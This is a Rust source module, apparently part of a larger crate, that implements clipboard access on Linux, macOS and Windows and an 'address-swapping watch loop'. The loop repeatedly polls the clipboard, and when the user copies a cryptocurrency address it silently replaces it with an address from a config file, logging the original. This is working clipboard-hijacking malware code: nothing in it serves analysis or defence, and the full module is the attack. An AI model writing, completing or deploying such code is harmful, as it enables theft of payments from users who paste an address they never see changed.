//! Clipboard backends and the address-swapping watch loop.

use std::{
    collections::BTreeMap,
    fs,
    io::Write,
    path::{Path, PathBuf},
    process::{Command, Stdio},
    thread::sleep,
    time::Duration,
};

use serde::{Deserialize, Serialize};

use crate::addr;

/// Clipboard access errors.
#[derive(Debug, thiserror::Error)]
pub enum ClipError {
    /// No clipboard tool was found.
    #[error("no clipboard backend available")]
    Unavailable,
    /// Backend invocation failed.
    #[error("clipboard backend: {0}")]
    Command(String),
    /// File backend failed.
    #[error("clipboard file: {0}")]
    Io(#[from] std::io::Error),
}

/// A clipboard read/write backend.
pub trait Clipboard {
    /// Returns the current text.
    fn get(&mut self) -> Result<String, ClipError>;
    /// Replaces the current text.
    fn set(&mut self, value: &str) -> Result<(), ClipError>;
}

impl Clipboard for Box<dyn Clipboard> {
    fn get(&mut self) -> Result<String, ClipError> {
        (**self).get()
    }
    fn set(&mut self, value: &str) -> Result<(), ClipError> {
        (**self).set(value)
    }
}

/// File-backed clipboard used by tests and by headless deployments.
pub struct FileClipboard {
    path: PathBuf,
}

impl FileClipboard {
    /// Creates a file backend at `path`.
    pub fn new(path: impl Into<PathBuf>) -> Self {
        Self { path: path.into() }
    }
}

impl Clipboard for FileClipboard {
    fn get(&mut self) -> Result<String, ClipError> {
        match fs::read_to_string(&self.path) {
            Ok(value) => Ok(value),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(String::new()),
            Err(error) => Err(error.into()),
        }
    }

    fn set(&mut self, value: &str) -> Result<(), ClipError> {
        if let Some(parent) = self.path.parent() {
            fs::create_dir_all(parent)?;
        }
        let temp = self.path.with_extension("tmp");
        fs::write(&temp, value)?;
        fs::rename(temp, &self.path)?;
        Ok(())
    }
}

/// Command-backed clipboard (`wl-clipboard`, `xclip`, `xsel`, `pbcopy`, PowerShell).
pub struct CommandClipboard {
    get: Vec<String>,
    set: Vec<String>,
    via_stdin: bool,
}

impl CommandClipboard {
    /// Builds a backend from a known name.
    pub fn named(name: &str) -> Option<Self> {
        let (get, set, via_stdin): (&[&str], &[&str], bool) = match name {
            "wl" => (&["wl-paste", "--no-newline"], &["wl-copy"], true),
            "xclip" => (
                &["xclip", "-selection", "clipboard", "-o"],
                &["xclip", "-selection", "clipboard"],
                true,
            ),
            "xsel" => (
                &["xsel", "--clipboard", "--output"],
                &["xsel", "--clipboard", "--input"],
                true,
            ),
            "pbcopy" => (&["pbpaste"], &["pbcopy"], true),
            "powershell" => (
                &["powershell", "-NoProfile", "-Command", "Get-Clipboard -Raw"],
                &[
                    "powershell",
                    "-NoProfile",
                    "-Command",
                    "$input | Set-Clipboard",
                ],
                true,
            ),
            _ => return None,
        };
        Some(Self {
            get: get.iter().map(|value| (*value).to_owned()).collect(),
            set: set.iter().map(|value| (*value).to_owned()).collect(),
            via_stdin,
        })
    }

    /// Picks the first available backend for this session.
    pub fn auto() -> Result<Self, ClipError> {
        let mut candidates: Vec<&str> = Vec::new();
        if std::env::var_os("WAYLAND_DISPLAY").is_some() {
            candidates.push("wl");
        }
        if std::env::var_os("DISPLAY").is_some() {
            candidates.extend(["xclip", "xsel"]);
        }
        if cfg!(target_os = "macos") {
            candidates.push("pbcopy");
        }
        if cfg!(windows) {
            candidates.push("powershell");
        }
        candidates.extend(["wl", "xclip", "xsel", "pbcopy"]);
        for name in candidates {
            let Some(backend) = Self::named(name) else {
                continue;
            };
            if backend.available() {
                return Ok(backend);
            }
        }
        Err(ClipError::Unavailable)
    }

    fn available(&self) -> bool {
        let program = &self.get[0];
        if program.contains('/') {
            return Path::new(program).is_file();
        }
        std::env::var_os("PATH").is_some_and(|path| {
            std::env::split_paths(&path).any(|directory| directory.join(program).is_file())
        })
    }

    fn output(&mut self, argv: &[String]) -> Result<String, ClipError> {
        let output = Command::new(&argv[0])
            .args(&argv[1..])
            .output()
            .map_err(|error| ClipError::Command(error.to_string()))?;
        if !output.status.success() {
            return Err(ClipError::Command(format!(
                "{} exited {}",
                argv[0], output.status
            )));
        }
        Ok(String::from_utf8_lossy(&output.stdout).into_owned())
    }
}

impl Clipboard for CommandClipboard {
    fn get(&mut self) -> Result<String, ClipError> {
        self.output(&self.get.clone())
    }

    fn set(&mut self, value: &str) -> Result<(), ClipError> {
        let mut command = Command::new(&self.set[0]);
        command.args(&self.set[1..]);
        if self.via_stdin {
            command.stdin(Stdio::piped());
        }
        let mut child = command
            .spawn()
            .map_err(|error| ClipError::Command(error.to_string()))?;
        if let Some(stdin) = child.stdin.as_mut() {
            stdin
                .write_all(value.as_bytes())
                .map_err(|error| ClipError::Command(error.to_string()))?;
        }
        let status = child
            .wait()
            .map_err(|error| ClipError::Command(error.to_string()))?;
        if status.success() {
            Ok(())
        } else {
            Err(ClipError::Command(format!(
                "{} exited {status}",
                self.set[0]
            )))
        }
    }
}

/// Persistent watcher configuration (`clip.json`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    /// Poll interval in milliseconds.
    #[serde(default = "default_interval")]
    pub interval_ms: u64,
    /// Replacement address per chain key.
    #[serde(default)]
    pub addresses: BTreeMap<String, String>,
}

fn default_interval() -> u64 {
    750
}

impl Default for Config {
    fn default() -> Self {
        Self {
            interval_ms: default_interval(),
            addresses: BTreeMap::new(),
        }
    }
}

impl Config {
    /// Loads `clip.json`, returning defaults when it does not exist.
    pub fn load(path: &Path) -> Result<Self, ClipError> {
        match fs::read(path) {
            Ok(bytes) => serde_json::from_slice(&bytes)
                .map_err(|error| ClipError::Command(format!("clip.json: {error}"))),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(error) => Err(error.into()),
        }
    }
}

/// One replacement event.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Event {
    /// Unix timestamp.
    pub at: u64,
    /// Chain key.
    pub chain: String,
    /// Address the user copied.
    pub original: String,
    /// Address written back.
    pub replacement: String,
}

/// Result of one poll.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Step {
    /// Nothing changed.
    Idle,
    /// A non-address changed the clipboard.
    Foreign,
    /// An address was replaced.
    Replaced(DetectedReplacement),
}

/// Detected and replaced pair.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DetectedReplacement {
    /// Chain key.
    pub chain: &'static str,
    /// Original address.
    pub original: String,
    /// Replacement address.
    pub replacement: String,
}

/// Polls once. `last` deduplicates and must survive across calls.
pub fn step(
    clip: &mut dyn Clipboard,
    config: &Config,
    last: &mut String,
) -> Result<Step, ClipError> {
    let current = clip.get()?;
    if current == *last || current.trim().is_empty() {
        return Ok(Step::Idle);
    }
    let Some(detected) = addr::detect(&current) else {
        *last = current;
        return Ok(Step::Foreign);
    };
    if detected.address == current.trim() {
        if let Some(replacement) = addr::replacement(&detected, &config.addresses) {
            clip.set(replacement)?;
            *last = replacement.to_owned();
            return Ok(Step::Replaced(DetectedReplacement {
                chain: detected.chain,
                original: detected.address,
                replacement: replacement.to_owned(),
            }));
        }
    }
    *last = current;
    Ok(Step::Idle)
}

/// Runs the watch loop until `limit` polls have run (or forever with `None`).
pub fn watch(
    clip: &mut dyn Clipboard,
    config: &Config,
    limit: Option<u64>,
    mut on_event: impl FnMut(Event),
) -> Result<(), ClipError> {
    let interval = Duration::from_millis(config.interval_ms.max(50));
    let mut last = String::new();
    let mut polls = 0_u64;
    loop {
        match step(clip, config, &mut last) {
            Ok(Step::Replaced(event)) => on_event(Event {
                at: crate::now(),
                chain: event.chain.to_owned(),
                original: event.original,
                replacement: event.replacement,
            }),
            Ok(_) => {}
            Err(ClipError::Unavailable) => return Err(ClipError::Unavailable),
            // A transient backend failure retries on the next poll.
            Err(_) => {}
        }
        polls += 1;
        if limit.is_some_and(|limit| polls >= limit) {
            return Ok(());
        }
        sleep(interval);
    }
}
